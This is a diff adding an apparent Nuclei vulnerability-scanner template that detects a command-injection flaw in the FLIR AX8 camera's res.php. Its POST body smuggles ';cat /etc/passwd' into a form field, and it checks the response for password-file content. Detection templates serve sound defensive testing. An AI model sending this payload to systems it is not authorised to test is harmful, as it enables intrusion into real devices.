@@ -1,0 +1,28 @@
+id: flir-ax8-res-php-rce
+info:
+  name: FLIR-AX8 res.php Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/res.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "action=node&resource=;cat+/etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
